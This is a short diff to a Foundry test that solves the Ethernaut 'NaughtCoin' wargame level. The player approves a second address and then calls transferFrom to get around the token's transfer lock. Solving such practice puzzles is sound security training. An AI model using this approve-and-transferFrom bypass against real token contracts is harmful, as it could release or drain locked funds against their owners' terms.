@@ -56,6 +56,16 @@ contract TestNaughtCoin is Test, Utils {
     function testSolve() public {
         vm.startPrank(player);
 
+        instance.approve(address(this), instance.balanceOf(player));
+
+        vm.startPrank(address(this));
+        instance.transferFrom(
+            player,
+            address(this),
+            instance.balanceOf(player)
+        );
+
+        vm.startPrank(player);
         assertTrue(submitLevelInstance(ethernaut, address(instance)));
     }
 }
